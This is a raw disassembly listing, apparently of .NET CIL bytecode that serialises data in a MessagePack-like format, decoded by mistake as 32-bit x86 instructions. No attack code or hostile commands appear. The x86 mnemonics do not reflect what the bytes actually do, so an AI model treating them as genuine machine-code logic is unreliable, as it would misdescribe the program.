  4051c6:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4051ca:	01 0b                	add    %ecx,(%ebx)
  4051cc:	03 07                	add    (%edi),%eax
  4051ce:	16                   	push   %ss
  4051cf:	18 6f 45             	sbb    %ch,0x45(%edi)
  4051d2:	00 00                	add    %al,(%eax)
  4051d4:	0a 26                	or     (%esi),%ah
  4051d6:	07                   	pop    %es
  4051d7:	28 58 00             	sub    %bl,0x0(%eax)
  4051da:	00 06                	add    %al,(%esi)
  4051dc:	0b 07                	or     (%edi),%eax
  4051de:	16                   	push   %ss
  4051df:	28 07                	sub    %al,(%edi)
  4051e1:	01 00                	add    %eax,(%eax)
  4051e3:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4051e6:	28 6b 00             	sub    %ch,0x0(%ebx)
  4051e9:	00 06                	add    %al,(%esi)
  4051eb:	02 18                	add    (%eax),%bl
  4051ed:	7d 36                	jge    0x405225
  4051ef:	00 00                	add    %al,(%eax)
  4051f1:	04 16                	add    $0x16,%al
  4051f3:	0d 38 1c 00 00       	or     $0x1c38,%eax
  4051f8:	00 02                	add    %al,(%edx)
  4051fa:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4051fe:	06                   	push   %es
  4051ff:	25 03 28 96 00       	and    $0x962803,%eax
  405204:	00 06                	add    %al,(%esi)
  405206:	6f                   	outsl  %ds:(%esi),(%dx)
  405207:	6a 00                	push   $0x0
  405209:	00 06                	add    %al,(%esi)
  40520b:	03 6f 88             	add    -0x78(%edi),%ebp
  40520e:	00 00                	add    %al,(%eax)
  405210:	06                   	push   %es
  405211:	09 17                	or     %edx,(%edi)
  405213:	58                   	pop    %eax
  405214:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  405219:	2a 06                	sub    (%esi),%al
  40521b:	20 df                	and    %bl,%bh
  40521d:	00 00                	add    %al,(%eax)
  40521f:	00 40 55             	add    %al,0x55(%eax)
  405222:	00 00                	add    %al,(%eax)
  405224:	00 1a                	add    %bl,(%edx)
  405226:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40522a:	01 0b                	add    %ecx,(%ebx)
  40522c:	03 07                	add    (%edi),%eax
  40522e:	16                   	push   %ss
  40522f:	1a 6f 45             	sbb    0x45(%edi),%ch
  405232:	00 00                	add    %al,(%eax)
  405234:	0a 26                	or     (%esi),%ah
  405236:	07                   	pop    %es
  405237:	28 58 00             	sub    %bl,0x0(%eax)
  40523a:	00 06                	add    %al,(%esi)
  40523c:	0b 07                	or     (%edi),%eax
  40523e:	16                   	push   %ss
  40523f:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405243:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405246:	28 6b 00             	sub    %ch,0x0(%ebx)
  405249:	00 06                	add    %al,(%esi)
  40524b:	02 18                	add    (%eax),%bl
  40524d:	7d 36                	jge    0x405285
  40524f:	00 00                	add    %al,(%eax)
  405251:	04 16                	add    $0x16,%al
  405253:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405258:	00 02                	add    %al,(%edx)
  40525a:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40525e:	06                   	push   %es
  40525f:	25 03 28 96 00       	and    $0x962803,%eax
  405264:	00 06                	add    %al,(%esi)
  405266:	6f                   	outsl  %ds:(%esi),(%dx)
  405267:	6a 00                	push   $0x0
  405269:	00 06                	add    %al,(%esi)
  40526b:	03 6f 88             	add    -0x78(%edi),%ebp
  40526e:	00 00                	add    %al,(%eax)
  405270:	06                   	push   %es
  405271:	09 17                	or     %edx,(%edi)
  405273:	58                   	pop    %eax
  405274:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  405279:	2a 06                	sub    (%esi),%al
  40527b:	20 da                	and    %bl,%dl
  40527d:	00 00                	add    %al,(%eax)
  40527f:	00 40 0e             	add    %al,0xe(%eax)
  405282:	00 00                	add    %al,(%eax)
  405284:	00 02                	add    %al,(%edx)
  405286:	06                   	push   %es
  405287:	03 28                	add    (%eax),%ebp
  405289:	97                   	xchg   %eax,%edi
  40528a:	00 00                	add    %al,(%eax)
  40528c:	06                   	push   %es
  40528d:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  405293:	06                   	push   %es
  405294:	20 db                	and    %bl,%bl
  405296:	00 00                	add    %al,(%eax)
  405298:	00 40 0e             	add    %al,0xe(%eax)
  40529b:	00 00                	add    %al,(%eax)
  40529d:	00 02                	add    %al,(%edx)
  40529f:	06                   	push   %es
  4052a0:	03 28                	add    (%eax),%ebp
  4052a2:	97                   	xchg   %eax,%edi
  4052a3:	00 00                	add    %al,(%eax)
  4052a5:	06                   	push   %es
  4052a6:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  4052ac:	06                   	push   %es
  4052ad:	20 d0                	and    %dl,%al
  4052af:	00 00                	add    %al,(%eax)
  4052b1:	00 40 0f             	add    %al,0xf(%eax)
  4052b4:	00 00                	add    %al,(%eax)
  4052b6:	00 02                	add    %al,(%edx)
  4052b8:	03 6f 00             	add    0x0(%edi),%ebp
  4052bb:	01 00                	add    %eax,(%eax)
  4052bd:	0a 67 6a             	or     0x6a(%edi),%ah
  4052c0:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  4052c4:	06                   	push   %es
  4052c5:	2a 06                	sub    (%esi),%al
  4052c7:	20 d1                	and    %dl,%cl
  4052c9:	00 00                	add    %al,(%eax)
  4052cb:	00 40 27             	add    %al,0x27(%eax)
  4052ce:	00 00                	add    %al,(%eax)
  4052d0:	00 18                	add    %bl,(%eax)
  4052d2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4052d6:	01 0b                	add    %ecx,(%ebx)
  4052d8:	03 07                	add    (%edi),%eax
  4052da:	16                   	push   %ss
  4052db:	18 6f 45             	sbb    %ch,0x45(%edi)
  4052de:	00 00                	add    %al,(%eax)
  4052e0:	0a 26                	or     (%esi),%ah
  4052e2:	07                   	pop    %es
  4052e3:	28 58 00             	sub    %bl,0x0(%eax)
  4052e6:	00 06                	add    %al,(%esi)
  4052e8:	0b 02                	or     (%edx),%eax
  4052ea:	07                   	pop    %es
  4052eb:	16                   	push   %ss
  4052ec:	28 07                	sub    %al,(%edi)
  4052ee:	01 00                	add    %eax,(%eax)
  4052f0:	0a 6a 28             	or     0x28(%edx),%ch
  4052f3:	74 00                	je     0x4052f5
  4052f5:	00 06                	add    %al,(%esi)
  4052f7:	2a 06                	sub    (%esi),%al
  4052f9:	20 d2                	and    %dl,%dl
  4052fb:	00 00                	add    %al,(%eax)
  4052fd:	00 40 27             	add    %al,0x27(%eax)
  405300:	00 00                	add    %al,(%eax)
  405302:	00 1a                	add    %bl,(%edx)
  405304:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405308:	01 0b                	add    %ecx,(%ebx)
  40530a:	03 07                	add    (%edi),%eax
  40530c:	16                   	push   %ss
  40530d:	1a 6f 45             	sbb    0x45(%edi),%ch
  405310:	00 00                	add    %al,(%eax)
  405312:	0a 26                	or     (%esi),%ah
  405314:	07                   	pop    %es
  405315:	28 58 00             	sub    %bl,0x0(%eax)
  405318:	00 06                	add    %al,(%esi)
  40531a:	0b 02                	or     (%edx),%eax
  40531c:	07                   	pop    %es
  40531d:	16                   	push   %ss
  40531e:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405322:	0a 6a 28             	or     0x28(%edx),%ch
  405325:	74 00                	je     0x405327
  405327:	00 06                	add    %al,(%esi)
  405329:	2a 06                	sub    (%esi),%al
  40532b:	20 d3                	and    %dl,%bl
  40532d:	00 00                	add    %al,(%eax)
  40532f:	00 40 25             	add    %al,0x25(%eax)
  405332:	00 00                	add    %al,(%eax)
  405334:	00 1e                	add    %bl,(%esi)
  405336:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40533a:	01 0b                	add    %ecx,(%ebx)
  40533c:	03 07                	add    (%edi),%eax
  40533e:	16                   	push   %ss
  40533f:	1e                   	push   %ds
  405340:	6f                   	outsl  %ds:(%esi),(%dx)
  405341:	45                   	inc    %ebp
  405342:	00 00                	add    %al,(%eax)
  405344:	0a 26                	or     (%esi),%ah
  405346:	07                   	pop    %es
  405347:	28 58 00             	sub    %bl,0x0(%eax)
  40534a:	00 06                	add    %al,(%esi)
  40534c:	0b 02                	or     (%edx),%eax
  40534e:	07                   	pop    %es
  40534f:	16                   	push   %ss
  405350:	28 08                	sub    %cl,(%eax)
  405352:	01 00                	add    %eax,(%eax)
  405354:	0a 28                	or     (%eax),%ch
  405356:	74 00                	je     0x405358
  405358:	00 06                	add    %al,(%esi)
  40535a:	2a 00                	sub    (%eax),%al
  40535c:	1b 30                	sbb    (%eax),%esi
  40535e:	04 00                	add    $0x0,%al
  405360:	4d                   	dec    %ebp
  405361:	00 00                	add    %al,(%eax)
  405363:	00 27                	add    %ah,(%edi)
  405365:	00 00                	add    %al,(%eax)
  405367:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40536a:	00 00                	add    %al,(%eax)
  40536c:	0a 0a                	or     (%edx),%cl
  40536e:	02 06                	add    (%esi),%al
  405370:	28 8a 00 00 06 06    	sub    %cl,0x6060000(%edx)
  405376:	6f                   	outsl  %ds:(%esi),(%dx)
  405377:	e2 00                	loop   0x405379
  405379:	00 0a                	add    %cl,(%edx)
  40537b:	d4 8d                	aam    $0x8d
  40537d:	44                   	inc    %esp
  40537e:	00 00                	add    %al,(%eax)
  405380:	01 0b                	add    %ecx,(%ebx)
  405382:	06                   	push   %es
  405383:	16                   	push   %ss
  405384:	6a 6f                	push   $0x6f
  405386:	4e                   	dec    %esi
  405387:	00 00                	add    %al,(%eax)
  405389:	0a 06                	or     (%esi),%al
  40538b:	07                   	pop    %es
  40538c:	16                   	push   %ss
  40538d:	06                   	push   %es
  40538e:	6f                   	outsl  %ds:(%esi),(%dx)
  40538f:	e2 00                	loop   0x405391
  405391:	00 0a                	add    %cl,(%edx)
  405393:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  40539a:	07                   	pop    %es
  40539b:	28 a3 00 00 06 0c    	sub    %ah,0xc060000(%ebx)
  4053a1:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  4053a7:	39 06                	cmp    %eax,(%esi)
  4053a9:	00 00                	add    %al,(%eax)
  4053ab:	00 06                	add    %al,(%esi)
  4053ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4053ae:	33 00                	xor    (%eax),%eax
  4053b0:	00 0a                	add    %cl,(%edx)
  4053b2:	dc 08                	fmull  (%eax)
  4053b4:	2a 00                	sub    (%eax),%al
  4053b6:	00 00                	add    %al,(%eax)
  4053b8:	01 10                	add    %edx,(%eax)
  4053ba:	00 00                	add    %al,(%eax)
  4053bc:	02 00                	add    (%eax),%al
  4053be:	06                   	push   %es
  4053bf:	00 38                	add    %bh,(%eax)
  4053c1:	3e 00 0d 00 00 00 00 	add    %cl,%ds:0x0
  4053c8:	13 30                	adc    (%eax),%esi
  4053ca:	02 00                	add    (%eax),%al
  4053cc:	ec                   	in     (%dx),%al
  4053cd:	00 00                	add    %al,(%eax)
  4053cf:	00 20                	add    %ah,(%eax)
  4053d1:	00 00                	add    %al,(%eax)
  4053d3:	11 02                	adc    %eax,(%edx)
  4053d5:	7b 36                	jnp    0x40540d
  4053d7:	00 00                	add    %al,(%eax)
  4053d9:	04 0a                	add    $0xa,%al
  4053db:	06                   	push   %es
  4053dc:	45                   	inc    %ebp
  4053dd:	0c 00                	or     $0x0,%al
  4053df:	00 00                	add    %al,(%eax)
  4053e1:	05 00 00 00 05       	add    $0x5000000,%eax
  4053e6:	00 00                	add    %al,(%eax)
  4053e8:	00 98 00 00 00 a0    	add    %bl,-0x60000000(%eax)
  4053ee:	00 00                	add    %al,(%eax)
  4053f0:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4053f3:	00 00                	add    %al,(%eax)
  4053f5:	1e                   	push   %ds
  4053f6:	00 00                	add    %al,(%eax)
  4053f8:	00 30                	add    %dh,(%eax)
  4053fa:	00 00                	add    %al,(%eax)
  4053fc:	00 42 00             	add    %al,0x0(%edx)
  4053ff:	00 00                	add    %al,(%eax)
  405401:	54                   	push   %esp
  405402:	00 00                	add    %al,(%eax)
  405404:	00 66 00             	add    %ah,0x0(%esi)
  405407:	00 00                	add    %al,(%eax)
  405409:	79 00                	jns    0x40540b
  40540b:	00 00                	add    %al,(%eax)
  40540d:	86 00                	xchg   %al,(%eax)
  40540f:	00 00                	add    %al,(%eax)
  405411:	38 a3 00 00 00 03    	cmp    %ah,0x3000000(%ebx)
  405417:	28 99 00 00 06 2a    	sub    %bl,0x2a060000(%ecx)
  40541d:	03 02                	add    (%edx),%eax
  40541f:	7b 35                	jnp    0x405456
  405421:	00 00                	add    %al,(%eax)
  405423:	04 74                	add    $0x74,%al
  405425:	38 00                	cmp    %al,(%eax)
  405427:	00 01                	add    %al,(%ecx)
  405429:	28 9a 00 00 06 2a    	sub    %bl,0x2a060000(%edx)
  40542f:	03 02                	add    (%edx),%eax
  405431:	7b 35                	jnp    0x405468
  405433:	00 00                	add    %al,(%eax)
  405435:	04 a5                	add    $0xa5,%al
  405437:	68 00 00 01 28       	push   $0x28010000
  40543c:	a0 00 00 06 2a       	mov    0x2a060000,%al
  405441:	03 02                	add    (%edx),%eax
  405443:	7b 35                	jnp    0x40547a
  405445:	00 00                	add    %al,(%eax)
  405447:	04 a5                	add    $0xa5,%al
  405449:	95                   	xchg   %eax,%ebp
  40544a:	00 00                	add    %al,(%eax)
  40544c:	01 28                	add    %ebp,(%eax)
  40544e:	9f                   	lahf
  40544f:	00 00                	add    %al,(%eax)
  405451:	06                   	push   %es
  405452:	2a 03                	sub    (%ebx),%al
  405454:	02 7b 35             	add    0x35(%ebx),%bh
  405457:	00 00                	add    %al,(%eax)
  405459:	04 a5                	add    $0xa5,%al
  40545b:	6c                   	insb   (%dx),%es:(%edi)
  40545c:	00 00                	add    %al,(%eax)
  40545e:	01 28                	add    %ebp,(%eax)
  405460:	9e                   	sahf
  405461:	00 00                	add    %al,(%eax)
  405463:	06                   	push   %es
  405464:	2a 03                	sub    (%ebx),%al
  405466:	02 7b 35             	add    0x35(%ebx),%bh
  405469:	00 00                	add    %al,(%eax)
  40546b:	04 a5                	add    $0xa5,%al
  40546d:	96                   	xchg   %eax,%esi
  40546e:	00 00                	add    %al,(%eax)
  405470:	01 28                	add    %ebp,(%eax)
  405472:	9c                   	pushf
  405473:	00 00                	add    %al,(%eax)
  405475:	06                   	push   %es
  405476:	2a 03                	sub    (%ebx),%al
  405478:	02 7b 35             	add    0x35(%ebx),%bh
  40547b:	00 00                	add    %al,(%eax)
  40547d:	04 a5                	add    $0xa5,%al
  40547f:	97                   	xchg   %eax,%edi
  405480:	00 00                	add    %al,(%eax)
  405482:	01 6c 28 9c          	add    %ebp,-0x64(%eax,%ebp,1)
  405486:	00 00                	add    %al,(%eax)
  405488:	06                   	push   %es
  405489:	2a 03                	sub    (%ebx),%al
  40548b:	02 28                	add    (%eax),%ch
  40548d:	77 00                	ja     0x40548f
  40548f:	00 06                	add    %al,(%esi)
  405491:	28 a0 00 00 06 2a    	sub    %ah,0x2a060000(%eax)
  405497:	03 02                	add    (%edx),%eax
  405499:	7b 35                	jnp    0x4054d0
  40549b:	00 00                	add    %al,(%eax)
  40549d:	04 74                	add    $0x74,%al
  40549f:	02 00                	add    (%eax),%al
  4054a1:	00 1b                	add    %bl,(%ebx)
  4054a3:	28 9b 00 00 06 2a    	sub    %bl,0x2a060000(%ebx)
  4054a9:	02 03                	add    (%ebx),%al
  4054ab:	28 72 00             	sub    %dh,0x0(%edx)
  4054ae:	00 06                	add    %al,(%esi)
  4054b0:	2a 02                	sub    (%edx),%al
  4054b2:	03 28                	add    (%eax),%ebp
  4054b4:	73 00                	jae    0x4054b6
  4054b6:	00 06                	add    %al,(%esi)
  4054b8:	2a 03                	sub    (%ebx),%al
  4054ba:	28 99 00 00 06 2a    	sub    %bl,0x2a060000(%ecx)
  4054c0:	1b 30                	sbb    (%eax),%esi
  4054c2:	03 00                	add    (%eax),%eax
  4054c4:	42                   	inc    %edx
  4054c5:	00 00                	add    %al,(%eax)
  4054c7:	00 28                	add    %ch,(%eax)
  4054c9:	00 00                	add    %al,(%eax)
  4054cb:	11 02                	adc    %eax,(%edx)
  4054cd:	0a 16                	or     (%esi),%dl
  4054cf:	0b 06                	or     (%esi),%eax
  4054d1:	12 01                	adc    (%ecx),%al
  4054d3:	28 49 00             	sub    %cl,0x0(%ecx)
  4054d6:	00 0a                	add    %cl,(%edx)
  4054d8:	02 7b 39             	add    0x39(%ebx),%bh
  4054db:	00 00                	add    %al,(%eax)
  4054dd:	04 3a                	add    $0x3a,%al
  4054df:	12 00                	adc    (%eax),%al
  4054e1:	00 00                	add    %al,(%eax)
  4054e3:	02 02                	add    (%edx),%al
  4054e5:	02 7b 38             	add    0x38(%ebx),%bh
  4054e8:	00 00                	add    %al,(%eax)
  4054ea:	04 73                	add    $0x73,%al
  4054ec:	63 00                	arpl   %eax,(%eax)
  4054ee:	00 06                	add    %al,(%esi)
  4054f0:	7d 39                	jge    0x40552b
  4054f2:	00 00                	add    %al,(%eax)
  4054f4:	04 dd                	add    $0xdd,%al
  4054f6:	0d 00 00 00 07       	or     $0x7000000,%eax
  4054fb:	39 06                	cmp    %eax,(%esi)
  4054fd:	00 00                	add    %al,(%eax)
  4054ff:	00 06                	add    %al,(%esi)
  405501:	28 50 00             	sub    %dl,0x0(%eax)
  405504:	00 0a                	add    %cl,(%edx)
  405506:	dc 02                	faddl  (%edx)
  405508:	7b 39                	jnp    0x405543
  40550a:	00 00                	add    %al,(%eax)
  40550c:	04 2a                	add    $0x2a,%al
  40550e:	00 00                	add    %al,(%eax)
  405510:	01 10                	add    %edx,(%eax)
  405512:	00 00                	add    %al,(%eax)
  405514:	02 00                	add    (%eax),%al
  405516:	04 00                	add    $0x0,%al
  405518:	2a 2e                	sub    (%esi),%ch
  40551a:	00 0d 00 00 00 00    	add    %cl,0x0
  405520:	13 30                	adc    (%eax),%esi
  405522:	04 00                	add    $0x0,%al
  405524:	18 00                	sbb    %al,(%eax)
  405526:	00 00                	add    %al,(%eax)
  405528:	29 00                	sub    %eax,(%eax)
  40552a:	00 11                	add    %dl,(%ecx)
  40552c:	03 8d 44 00 00 01    	add    0x1000044(%ebp),%ecx
  405532:	0a 02                	or     (%edx),%al
  405534:	06                   	push   %es
  405535:	16                   	push   %ss
  405536:	03 6f 45             	add    0x45(%edi),%ebp
  405539:	00 00                	add    %al,(%eax)
  40553b:	0a 26                	or     (%esi),%ah
  40553d:	06                   	push   %es
  40553e:	28 55 00             	sub    %dl,0x0(%ebp)
  405541:	00 06                	add    %al,(%esi)
  405543:	2a 13                	sub    (%ebx),%dl
  405545:	30 04 00             	xor    %al,(%eax,%eax,1)
  405548:	b1 00                	mov    $0x0,%cl
  40554a:	00 00                	add    %al,(%eax)
  40554c:	2a 00                	sub    (%eax),%al
  40554e:	00 11                	add    %dl,(%ecx)
  405550:	14 0a                	adc    $0xa,%al
  405552:	16                   	push   %ss
  405553:	0b 02                	or     (%edx),%eax
  405555:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  40555b:	18 00                	sbb    %al,(%eax)
  40555d:	00 00                	add    %al,(%eax)
  40555f:	02 20                	add    (%eax),%ah
  405561:	bf 00 00 00 3d       	mov    $0x3d000000,%edi
  405566:	0d 00 00 00 02       	or     $0x2000000,%eax
  40556b:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  405571:	0b 38                	or     (%eax),%edi
  405573:	72 00                	jb     0x405575
  405575:	00 00                	add    %al,(%eax)
  405577:	02 20                	add    (%eax),%ah
  405579:	d9 00                	flds   (%eax)
  40557b:	00 00                	add    %al,(%eax)
  40557d:	40                   	inc    %eax
  40557e:	0c 00                	or     $0x0,%al
  405580:	00 00                	add    %al,(%eax)
  405582:	03 6f 00             	add    0x0(%edi),%ebp
  405585:	01 00                	add    %eax,(%eax)
  405587:	0a 0b                	or     (%ebx),%cl
  405589:	38 5b 00             	cmp    %bl,0x0(%ebx)
  40558c:	00 00                	add    %al,(%eax)
  40558e:	02 20                	add    (%eax),%ah
  405590:	da 00                	fiaddl (%eax)
  405592:	00 00                	add    %al,(%eax)
  405594:	40                   	inc    %eax
  405595:	25 00 00 00 18       	and    $0x18000000,%eax
  40559a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40559e:	01 0a                	add    %ecx,(%edx)
  4055a0:	03 06                	add    (%esi),%eax
  4055a2:	16                   	push   %ss
  4055a3:	18 6f 45             	sbb    %ch,0x45(%edi)
  4055a6:	00 00                	add    %al,(%eax)
  4055a8:	0a 26                	or     (%esi),%ah
  4055aa:	06                   	push   %es
  4055ab:	28 58 00             	sub    %bl,0x0(%eax)
  4055ae:	00 06                	add    %al,(%esi)
  4055b0:	0a 06                	or     (%esi),%al
  4055b2:	16                   	push   %ss
  4055b3:	28 02                	sub    %al,(%edx)
  4055b5:	01 00                	add    %eax,(%eax)
  4055b7:	0a 0b                	or     (%ebx),%cl
  4055b9:	38 2b                	cmp    %ch,(%ebx)
  4055bb:	00 00                	add    %al,(%eax)
  4055bd:	00 02                	add    %al,(%edx)
  4055bf:	20 db                	and    %bl,%bl
  4055c1:	00 00                	add    %al,(%eax)
  4055c3:	00 40 20             	add    %al,0x20(%eax)
  4055c6:	00 00                	add    %al,(%eax)
  4055c8:	00 1a                	add    %bl,(%edx)
  4055ca:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055ce:	01 0a                	add    %ecx,(%edx)
  4055d0:	03 06                	add    (%esi),%eax
  4055d2:	16                   	push   %ss
  4055d3:	1a 6f 45             	sbb    0x45(%edi),%ch
  4055d6:	00 00                	add    %al,(%eax)
  4055d8:	0a 26                	or     (%esi),%ah
  4055da:	06                   	push   %es
  4055db:	28 58 00             	sub    %bl,0x0(%eax)
  4055de:	00 06                	add    %al,(%esi)
  4055e0:	0a 06                	or     (%esi),%al
  4055e2:	16                   	push   %ss
  4055e3:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4055e7:	0a 0b                	or     (%ebx),%cl
  4055e9:	07                   	pop    %es
  4055ea:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055ee:	01 0a                	add    %ecx,(%edx)
  4055f0:	03 06                	add    (%esi),%eax
  4055f2:	16                   	push   %ss
  4055f3:	07                   	pop    %es
  4055f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4055f5:	45                   	inc    %ebp
  4055f6:	00 00                	add    %al,(%eax)
  4055f8:	0a 26                	or     (%esi),%ah
  4055fa:	06                   	push   %es
  4055fb:	28 55 00             	sub    %dl,0x0(%ebp)
  4055fe:	00 06                	add    %al,(%esi)
  405600:	2a 00                	sub    (%eax),%al
  405602:	00 00                	add    %al,(%eax)
  405604:	13 30                	adc    (%eax),%esi
  405606:	04 00                	add    $0x0,%al
  405608:	b9 00 00 00 2b       	mov    $0x2b000000,%ecx
  40560d:	00 00                	add    %al,(%eax)
  40560f:	11 03                	adc    %eax,(%ebx)
  405611:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  405615:	06                   	push   %es
  405616:	0a 14 0b             	or     (%ebx,%ecx,1),%dl
  405619:	06                   	push   %es
  40561a:	8e 69 0c             	mov    0xc(%ecx),%gs
  40561d:	16                   	push   %ss
  40561e:	0d 08 1f 1f 3d       	or     $0x3d1f1f08,%eax
  405623:	16                   	push   %ss
  405624:	00 00                	add    %al,(%eax)
  405626:	00 20                	add    %ah,(%eax)
  405628:	a0 00 00 00 08       	mov    0x8000000,%al
  40562d:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  405630:	0d 02 09 6f ee       	or     $0xee6f0902,%eax
  405635:	00 00                	add    %al,(%eax)
  405637:	0a 38                	or     (%eax),%bh
  405639:	80 00 00             	addb   $0x0,(%eax)
  40563c:	00 08                	add    %cl,(%eax)
  40563e:	20 ff                	and    %bh,%bh
  405640:	00 00                	add    %al,(%eax)
  405642:	00 3d 1c 00 00 00    	add    %bh,0x1c
  405648:	20 d9                	and    %bl,%cl
  40564a:	00 00                	add    %al,(%eax)
  40564c:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  405652:	00 00                	add    %al,(%eax)
  405654:	0a 08                	or     (%eax),%cl
  405656:	d2 0d 02 09 6f ee    	rorb   %cl,0xee6f0902
  40565c:	00 00                	add    %al,(%eax)
  40565e:	0a 38                	or     (%eax),%bh
  405660:	59                   	pop    %ecx
  405661:	00 00                	add    %al,(%eax)
  405663:	00 08                	add    %cl,(%eax)
  405665:	20 ff                	and    %bh,%bh
  405667:	ff 00                	incl   (%eax)
  405669:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40566f:	20 da                	and    %bl,%dl
  405671:	00 00                	add    %al,(%eax)
  405673:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  405679:	00 00                	add    %al,(%eax)
  40567b:	0a 08                	or     (%eax),%cl
  40567d:	68 28 ef 00 00       	push   $0xef28
  405682:	0a 28                	or     (%eax),%ch
  405684:	58                   	pop    %eax
  405685:	00 00                	add    %al,(%eax)
  405687:	06                   	push   %es
  405688:	0b 02                	or     (%edx),%eax
  40568a:	07                   	pop    %es
  40568b:	16                   	push   %ss
  40568c:	07                   	pop    %es
  40568d:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405690:	4c                   	dec    %esp
  405691:	00 00                	add    %al,(%eax)
  405693:	0a 38                	or     (%eax),%bh
  405695:	24 00                	and    $0x0,%al
  405697:	00 00                	add    %al,(%eax)
  405699:	20 db                	and    %bl,%bl
  40569b:	00 00                	add    %al,(%eax)
  40569d:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  4056a3:	00 00                	add    %al,(%eax)
  4056a5:	0a 08                	or     (%eax),%cl
  4056a7:	28 4a 00             	sub    %cl,0x0(%edx)
  4056aa:	00 0a                	add    %cl,(%edx)
  4056ac:	28 58 00             	sub    %bl,0x0(%eax)
  4056af:	00 06                	add    %al,(%esi)
  4056b1:	0b 02                	or     (%edx),%eax
  4056b3:	07                   	pop    %es
  4056b4:	16                   	push   %ss
  4056b5:	07                   	pop    %es
  4056b6:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4056b9:	4c                   	dec    %esp
  4056ba:	00 00                	add    %al,(%eax)
  4056bc:	0a 02                	or     (%edx),%al
  4056be:	06                   	push   %es
  4056bf:	16                   	push   %ss
  4056c0:	06                   	push   %es
  4056c1:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4056c4:	4c                   	dec    %esp
  4056c5:	00 00                	add    %al,(%eax)
  4056c7:	0a 2a                	or     (%edx),%ch
  4056c9:	00 00                	add    %al,(%eax)
  4056cb:	00 13                	add    %dl,(%ebx)
  4056cd:	30 04 00             	xor    %al,(%eax,%eax,1)
  4056d0:	94                   	xchg   %eax,%esp
  4056d1:	00 00                	add    %al,(%eax)
  4056d3:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4056d6:	00 11                	add    %dl,(%ecx)
  4056d8:	14 0a                	adc    $0xa,%al
  4056da:	03 8e 69 0b 16 0c    	add    0xc160b69(%esi),%ecx
  4056e0:	07                   	pop    %es
  4056e1:	20 ff                	and    %bh,%bh
  4056e3:	00 00                	add    %al,(%eax)
  4056e5:	00 3d 1c 00 00 00    	add    %bh,0x1c
  4056eb:	20 c4                	and    %al,%ah
  4056ed:	00 00                	add    %al,(%eax)
  4056ef:	00 0c 02             	add    %cl,(%edx,%eax,1)
  4056f2:	08 6f ee             	or     %ch,-0x12(%edi)
  4056f5:	00 00                	add    %al,(%eax)
  4056f7:	0a 07                	or     (%edi),%al
  4056f9:	d2 0c 02             	rorb   %cl,(%edx,%eax,1)
  4056fc:	08 6f ee             	or     %ch,-0x12(%edi)
  4056ff:	00 00                	add    %al,(%eax)
  405701:	0a 38                	or     (%eax),%bh
  405703:	59                   	pop    %ecx
  405704:	00 00                	add    %al,(%eax)
  405706:	00 07                	add    %al,(%edi)
  405708:	20 ff                	and    %bh,%bh
  40570a:	ff 00                	incl   (%eax)
  40570c:	00 3d 2a 00 00 00    	add    %bh,0x2a
  405712:	20 c5                	and    %al,%ch
  405714:	00 00                	add    %al,(%eax)
  405716:	00 0c 02             	add    %cl,(%edx,%eax,1)
  405719:	08 6f ee             	or     %ch,-0x12(%edi)
  40571c:	00 00                	add    %al,(%eax)
  40571e:	0a 07                	or     (%edi),%al
  405720:	68 28 ef 00 00       	push   $0xef28
  405725:	0a 28                	or     (%eax),%ch
  405727:	58                   	pop    %eax
  405728:	00 00                	add    %al,(%eax)
  40572a:	06                   	push   %es
  40572b:	0a 02                	or     (%edx),%al
  40572d:	06                   	push   %es
  40572e:	16                   	push   %ss
  40572f:	06                   	push   %es
  405730:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405733:	4c                   	dec    %esp
  405734:	00 00                	add    %al,(%eax)
  405736:	0a 38                	or     (%eax),%bh
  405738:	24 00                	and    $0x0,%al
  40573a:	00 00                	add    %al,(%eax)
  40573c:	20 c6                	and    %al,%dh
  40573e:	00 00                	add    %al,(%eax)
  405740:	00 0c 02             	add    %cl,(%edx,%eax,1)
  405743:	08 6f ee             	or     %ch,-0x12(%edi)
  405746:	00 00                	add    %al,(%eax)
  405748:	0a 07                	or     (%edi),%al
  40574a:	28 4a 00             	sub    %cl,0x0(%edx)
  40574d:	00 0a                	add    %cl,(%edx)
  40574f:	28 58 00             	sub    %bl,0x0(%eax)
  405752:	00 06                	add    %al,(%esi)
  405754:	0a 02                	or     (%edx),%al
  405756:	06                   	push   %es
  405757:	16                   	push   %ss
  405758:	06                   	push   %es
